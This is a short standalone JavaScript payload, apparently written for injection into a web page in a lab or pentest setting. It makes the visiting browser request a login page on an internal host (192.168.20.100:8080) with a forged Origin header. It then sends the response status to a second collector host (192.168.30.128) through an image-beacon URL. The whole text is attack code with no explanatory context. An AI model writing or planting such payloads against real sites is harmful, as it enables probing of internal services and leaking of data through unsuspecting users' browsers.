var xhr = new XMLHttpRequest();
xhr.open("GET", "http://192.168.20.100:8080/login");
xhr.setRequestHeader("Origin", "192.168.20.100:8080");
xhr.onreadystatechange = function () {
	if (xhr.readyState === 4) {
		var img = new Image();
		img.src = "http://192.168.30.128/hello.txt?x=" + xhr.status;
	}
};
xhr.send();
